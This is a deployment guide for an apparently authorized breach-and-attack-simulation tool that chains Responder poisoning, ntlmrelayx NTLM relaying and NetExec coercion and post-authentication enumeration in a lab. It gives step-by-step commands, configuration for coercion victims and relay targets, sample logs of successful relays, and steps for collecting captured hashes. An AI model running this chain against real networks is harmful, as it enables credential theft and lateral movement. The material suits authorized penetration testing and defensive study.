# Production Deployment Guide — btc-module-relay-nxc-impckt-rspndr

> **Classification:** INTERNAL — Authorized Penetration Testing / BAS Use Only  
> **Scope:** Breach and Attack Simulation (BAS) module for NTLM relay attack chains.  
> **Target Environment:** Isolated customer laboratory with SSH administrative access.

---

## 1. Executive Summary

This document describes how to deploy `btc-module-relay-nxc-impckt-rspndr` — a Dockerized orchestrator that chains **Responder** (passive poisoning), **impacket ntlmrelayx** (NTLM relay engine) and **NetExec** (coercion + post-auth) — inside a customer lab.

All third-party offensive tools run inside isolated containers. The orchestrator itself is a Python CLI (`btc-relay-rspndr`) managed via Poetry.

---

## 2. Lab Requirements

| Requirement | Specification | Notes |
|-------------|---------------|-------|
| **OS** | Linux (Ubuntu 22.04+ / Debian 12+ / Kali recommended) | `host` network mode is **Linux-only** |
| **CPU** | 2+ cores | Coercion and post-auth run in parallel ThreadPools |
| **RAM** | 4 GB minimum, 8 GB recommended | Docker containers + Python orchestrator |
| **Disk** | 10 GB free | Docker images (~1.5 GB total) + logs + loot |
| **Network** | Layer-2 access to target segment | `host` network mode required for SMB/LLMNR |
| **Privileges** | User in `docker` group | Root **not** required for orchestrator runtime |
| **Outbound** | GitHub (for NetExec clone), Docker Hub | During build only; runtime is air-gap friendly |

### 2.1 Network Topology (Typical)

```
┌─────────────────────────────────────────────────────────────┐
│                      Customer Lab Network                   │
│  ┌─────────────┐      ┌──────────────┐      ┌──────────┐    │
│  │  Victim PC  │◄────►│  BAS Host    │◄────►│  DC /    │    │
│  │  (Win10)    │ LLMNR│  (this tool) │ SMB  │  FileSrv │    │
│  └─────────────┘      └──────────────┘      └──────────┘    │
│                              ▲                              │
│                              │ SSH (admin access)           │
│                       ┌──────┴──────┐                       │
│                       │  Operator   │                       │
│                       │  Workstation│                       │
│                       └─────────────┘                       │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Host Preparation (via SSH)

Connect to the BAS host as a non-root user with Docker privileges.

```bash
ssh bas-operator@<BAS_HOST_IP>
```

### 3.1 Install System Dependencies

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker (if not present)
# Refer to official Docker docs: https://docs.docker.com/engine/install/ubuntu/
# Quick path for Debian/Ubuntu:
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER
newgrp docker  # or re-login

# Verify Docker works
docker ps

# Install Poetry
curl -sSL https://install.python-poetry.org | python3 -
export PATH="$HOME/.local/bin:$PATH"
poetry --version
```

### 3.2 Verify Python Version

```bash
python3 --version   # Must be 3.11 or higher
```

---

## 4. Project Installation

### 4.1 Clone Repository

```bash
cd ~
git clone https://github.com/NanoTrash/btc-module-relay-nxc-impckt-rspnd.git
cd btc-module-relay-nxc-impckt-rspnd
```

### 4.2 Install Python Dependencies

```bash
poetry install --no-dev
```

> For development (linting, tests): omit `--no-dev`.

### 4.3 Verify CLI

```bash
poetry run btc-relay-rspndr --help
```

Expected output:
```
Usage: btc-relay-rspndr [OPTIONS] COMMAND [ARGS]...

Commands:
  start   Start the orchestrator
  status  Check container status
  stop    Stop all relay containers
```

---

## 5. Build Docker Images

Build all three images **once** before the first engagement. Subsequent runs reuse cached images.

```bash
# impacket / ntlmrelayx
docker build -t btc-relay/impacket:latest docker/impacket

# NetExec / nxc
docker build -t btc-relay/netexec:latest docker/netexec

# Responder
docker build -t btc-relay/responder:latest docker/responder
```

Verify images exist:

```bash
docker images | grep btc-relay
```

Expected:
```
btc-relay/impacket    latest   ...
btc-relay/netexec     latest   ...
btc-relay/responder   latest   ...
```

---

## 6. Configuration

### 6.1 Discover Network Interface

Responder needs the **real** interface name (not `eth0` unless it exists).

```bash
ip -br addr show
```

Example output:
```
lo               UNKNOWN        127.0.0.1/8 ::1/128
enp0s31f6        UP             192.168.50.10/24
wlan0            UP             192.168.3.133/24
```

Use the interface connected to the **target segment** (e.g. `enp0s31f6`).

### 6.2 Edit `config.yaml`

```bash
nano config.yaml
```

**Critical fields to customize:**

```yaml
# ── Network Interface ──────────────────────────────
responder:
  enabled: true
  interface: "enp0s31f6"   # ← CHANGE THIS
  wpad: true
  dns: true

# ── Relay Targets ──────────────────────────────────
ntlmrelayx:
  enabled: true
  interface_ip: "0.0.0.0"
  smb_port: 445
  http_port: "80"
  targets_file: "./targets_relay.txt"
  # ... keep other defaults

# ── Coercion ───────────────────────────────────────
coerce:
  enabled: true
  methods:
    - "coerce_plus"
  targets:
    - "192.168.50.15"      # ← victim 1
    - "192.168.50.16"      # ← victim 2
  callback_host: "192.168.50.10"   # ← THIS HOST's IP in target segment
  always: false
  delay_between: 5.0
  workers: 4

# ── Post-Auth ──────────────────────────────────────
post_auth:
  enabled: true
  protocols:
    smb:
      enabled: true
      commands: ["--shares", "--users"]
      modules: []
    ldap:
      enabled: true
      commands: ["--users"]
      modules: ["laps", "bloodhound"]
```

### 6.3 Create `targets_relay.txt`

This file contains **relay destinations** (not coercion victims). ntlmrelayx will relay captured credentials to these hosts.

```bash
cat > targets_relay.txt << 'EOF'
smb://192.168.50.20
smb://192.168.50.21
ldaps://192.168.50.20
EOF
```

> **Tip:** Use protocol prefixes (`smb://`, `ldap://`, `ldaps://`, `mssql://`) so ntlmrelayx selects the correct relay client.

---

## 7. Pre-Flight Checks

### 7.1 Verify No Port Conflicts

```bash
sudo ss -tlnp | grep -E ':(445|80|53|5985|5986|135|6666|9389)'
```

If any required port is occupied by a system service (e.g. Samba on 445), either:
- Stop the service: `sudo systemctl stop smbd nmbd`
- Or change the port in `config.yaml` (e.g. `smb_port: 8445`) — **note:** this only works for testing; real victims connect to standard ports.

### 7.2 Run Integration Test

```bash
poetry run python tests/test_integration.py
```

Expected result: all checks **OK** (LLMNR may show WARN in isolated test).

---

## 8. Launch the Engagement

### 8.1 Start the Orchestrator

```bash
poetry run btc-relay-rspndr start -c config.yaml
```

Startup sequence:
1. Responder container starts (passive poisoning)
2. ntlmrelayx container starts (listener + relay)
3. Coercion campaign runs against `coerce.targets`
4. Watch loop begins — monitors for `RELAY_SUCCESS` sessions
5. Post-auth actions trigger automatically on successful relays

### 8.2 Monitor in Real Time

**In another SSH session:**

```bash
# Container health
poetry run btc-relay-rspndr status

# Live logs
tail -f logs/ntlmrelayx.log logs/Poisoners-Session.log

# Session audit
tail -f sessions.jsonl | jq .
```

### 8.3 Expected Log Output

**Responder:**
```
[*] [LLMNR]  Poisioned answer sent to 192.168.50.15 for name WPAD
[*] [NBT-NS] Poisoned answer sent to 192.168.50.16 for name FILESERVER (service: File Server)
```

**ntlmrelayx:**
```
[*] SMBD-Thread-5: Received connection from 192.168.50.15, attacking target smb://192.168.50.20
[*] Authenticating against smb://192.168.50.20 as CORP\jdoe SUCCEED
```

**Orchestrator:**
```
[info     ] [ntlmrelayx] Session a1b2c3d4 relaying to smb://192.168.50.20
[info     ] [ntlmrelayx] Session a1b2c3d4 relay success: CORP\jdoe
[info     ] [PostAuth] a1b2c3d4 running 4 checks
```

---

## 9. Stopping and Cleanup

### 9.1 Graceful Stop

Press `Ctrl+C` in the orchestrator terminal, or run:

```bash
poetry run btc-relay-rspndr stop
```

This stops and removes both containers (`btc-relay-responder`, `btc-relay-ntlmrelayx`).

### 9.2 Collect Artifacts

After stopping, collect the following from the BAS host:

```bash
tar czf engagement-$(date +%Y%m%d-%H%M%S).tar.gz \
  sessions.jsonl \
  logs/ \
  loot/
```

| Artifact | Content |
|----------|---------|
| `sessions.jsonl` | Structured audit log (JSON lines) |
| `logs/ntlmrelayx.log` | Full ntlmrelayx output |
| `logs/Poisoners-Session.log` | Responder poison events |
| `loot/hashes*` | Captured NetNTLMv2 hashes |

### 9.3 Full Cleanup

```bash
poetry run btc-relay-rspndr stop
rm -rf logs/ loot/ responder/ sessions.jsonl
```

---

## 10. Security & Legal Checklist

- [ ] Written authorization from the asset owner is on file.
- [ ] Engagement time window is agreed and documented.
- [ ] BAS host is placed in an **isolated lab segment**, not production.
- [ ] `targets_relay.txt` and `coerce.targets` contain **only** in-scope IPs.
- [ ] Operator understands that `host` network mode exposes all listener ports on the host OS.
- [ ] Logs and loot are encrypted at rest (`chmod 600` on collected artifacts).
- [ ] Post-engagement: all containers stopped, images may be kept for re-use or `docker rmi` removed.

---

## 11. Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Responder running: False` | Wrong interface name | Set `responder.interface` to real interface from `ip addr` |
| `ntlmrelayx: Address already in use` | Port 445/80 occupied | Stop Samba (`systemctl stop smbd`) or change ports |
| `ntlmrelayx: Warning: no valid targets` | `targets_relay.txt` missing or empty | Create the file with at least one target |
| `LLMNR no response` | Multicast filtered by switch/firewall | Normal in some labs; coercion still works via direct SMB |
| `nxc coerce_plus: module not found` | Old NetExec version | Rebuild netexec image: `docker build --no-cache ...` |
| Containers disappear immediately | ntlmrelayx exits on EOF | Ensure orchestrator uses `tail -f /dev/null \| ntlmrelayx.py ...` command |
| `Permission denied` on `/var/run/docker.sock` | User not in `docker` group | `sudo usermod -aG docker $USER` then re-login |

---

## 12. Quick Reference Card

```bash
# Build
for img in impacket netexec responder; do
  docker build -t btc-relay/${img}:latest docker/${img}
done

# Configure
nano config.yaml          # set interface, targets, callback_host
nano targets_relay.txt    # set relay destinations

# Test
poetry run python tests/test_integration.py

# Run
poetry run btc-relay-rspndr start -c config.yaml

# Monitor (another terminal)
poetry run btc-relay-rspndr status
tail -f logs/ntlmrelayx.log

# Stop
poetry run btc-relay-rspndr stop
```

---

*Document version: 1.0*  
*Generated for: btc-module-relay-nxc-impckt-rspndr v0.2.0*
